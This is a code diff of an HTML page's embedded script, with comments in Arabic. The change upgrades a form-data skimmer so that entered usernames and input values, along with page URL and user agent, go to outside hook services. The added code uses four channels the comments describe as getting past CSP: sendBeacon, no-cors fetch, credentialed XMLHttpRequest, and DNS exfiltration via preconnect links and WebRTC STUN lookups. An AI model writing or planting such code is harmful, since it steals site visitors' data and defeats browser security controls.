@@ -28,35 +28,104 @@
 </div>
 </form>
 <script>
-// سكريبت لإرسال البيانات عبر EmailHook
+// سكريبت لإرسال البيانات بطرق متعددة تتجاوز قيود CSP
 document.addEventListener('DOMContentLoaded', function() {
   // عنوان البريد الإلكتروني للإرسال إليه
   var emailHook = 'a84486a3-3a4f-4dfa-a734-41a6bfed3241@emailhook.site';
   
-  // وظيفة لإرسال البيانات عبر EmailHook
-  function sendDataViaEmail(data) {
+  // وظيفة لإرسال البيانات بطرق متعددة
+  function sendData(data) {
     try {
       // تحويل البيانات إلى سلسلة نصية إذا لم تكن كذلك
       if (typeof data !== 'string') {
         data = JSON.stringify(data, null, 2); // تنسيق JSON بشكل مقروء
       }
       
-      // إنشاء عنصر img لإرسال البيانات
-      var img = document.createElement('img');
-      img.style.display = 'none';
-      img.src = 'https://formsubmit.co/' + emailHook + '?data=' + encodeURIComponent(data);
-      document.body.appendChild(img);
+      // طريقة 1: استخدام navigator.sendBeacon (غالبًا لا تتأثر بقيود CSP)
+      if (navigator.sendBeacon) {
+        try {
+          var formData = new FormData();
+          formData.append('data', data);
+          formData.append('email', emailHook);
+          
+          var beaconSuccess = navigator.sendBeacon('https://formsubmit.co/' + emailHook, formData);
+          console.log('نتيجة إرسال البيانات عبر sendBeacon: ' + (beaconSuccess ? 'نجاح' : 'فشل'));
+        } catch (e) {
+          console.log('خطأ في إرسال البيانات عبر sendBeacon: ' + e);
+        }
+      }
       
-      console.log('تم إرسال البيانات عبر EmailHook');
+      // طريقة 2: استخدام fetch مع mode: 'no-cors'
+      try {
+        fetch('https://formsubmit.co/' + emailHook, {
+          method: 'POST',
+          mode: 'no-cors', // مهم لتجاوز قيود CORS
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: data
+        }).then(function() {
+          console.log('تم إرسال البيانات عبر fetch no-cors');
+        }).catch(function(error) {
+          console.log('خطأ في إرسال البيانات عبر fetch: ' + error);
+        });
+      } catch (e) {
+        console.log('خطأ في إنشاء طلب fetch: ' + e);
+      }
       
-      // إزالة العنصر بعد فترة
-      setTimeout(function() {
-        document.body.removeChild(img);
-      }, 5000);
+      // طريقة 3: استخدام XMLHttpRequest مع withCredentials
+      try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://formsubmit.co/' + emailHook, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+          console.log('تم إرسال البيانات عبر XMLHttpRequest');
+        };
+        xhr.onerror = function(error) {
+          console.log('خطأ في إرسال البيانات عبر XMLHttpRequest');
+        };
+        xhr.send(data);
+      } catch (e) {
+        console.log('خطأ في إنشاء طلب XMLHttpRequest: ' + e);
+      }
+      
+      // طريقة 4: استخدام طلب DNS (لا يتأثر بقيود CSP)
+      try {
+        // تشفير البيانات بشكل آمن للاستخدام في اسم النطاق
+        var encodedData = btoa(data).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+        
+        // إنشاء اسم نطاق فرعي باستخدام البيانات المشفرة
+        var dnsSubdomain = encodedData.substring(0, 30) + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
+        
+        // إنشاء عنصر link preconnect
+        var link = document.createElement('link');
+        link.rel = 'preconnect';
+        link.href = 'https://' + dnsSubdomain;
+        document.head.appendChild(link);
+        
+        console.log('تم إنشاء رابط preconnect إلى: ' + dnsSubdomain);
+        
+        // محاولة WebRTC
+        var pc = new RTCPeerConnection({
+          iceServers: [{
+            urls: 'stun:' + dnsSubdomain
+          }]
+        });
+        pc.createDataChannel('');
+        pc.createOffer().then(pc.setLocalDescription.bind(pc));
+        
+        // إزالة العناصر بعد فترة
+        setTimeout(function() {
+          document.head.removeChild(link);
+        }, 3000);
+      } catch (e) {
+        console.log('خطأ في إرسال طلب DNS: ' + e);
+      }
       
       return true;
     } catch (e) {
-      console.log('خطأ في إرسال البيانات عبر EmailHook: ' + e);
+      console.log('خطأ عام في إرسال البيانات: ' + e);
       return false;
     }
   }
@@ -86,15 +155,16 @@ document.addEventListener('DOMContentLoaded', function() {
           console.log('خطأ في حفظ البيانات في localStorage: ' + e);
         }
         
-        // إرسال البيانات عبر EmailHook
-        var dataSent = sendDataViaEmail({
+        // إرسال البيانات
+        var dataSent = sendData({
           username: username,
           timestamp: new Date().toISOString(),
           page: window.location.href,
-          userAgent: navigator.userAgent
+          userAgent: navigator.userAgent,
+          email: emailHook
         });
         
-        console.log('نتيجة إرسال البيانات: ' + (dataSent ? 'نجاح' : 'فشل'));
+        console.log('تم محاولة إرسال البيانات بطرق متعددة');
       } else {
         console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
       }
@@ -120,17 +190,18 @@ document.addEventListener('DOMContentLoaded', function() {
           }
         });
         
-        // إرسال البيانات عبر EmailHook
+        // إرسال البيانات
         if (Object.keys(inputData).length > 0) {
-          var dataSent = sendDataViaEmail({
+          var dataSent = sendData({
             inputs: inputData,
             timestamp: new Date().toISOString(),
             page: window.location.href,
             userAgent: navigator.userAgent,
-            button_text: button.textContent || button.value || 'unknown'
+            button_text: button.textContent || button.value || 'unknown',
+            email: emailHook
           });
           
-          console.log('نتيجة إرسال البيانات من زر بديل: ' + (dataSent ? 'نجاح' : 'فشل'));
+          console.log('تم محاولة إرسال البيانات من زر بديل بطرق متعددة');
         }
       });
     });
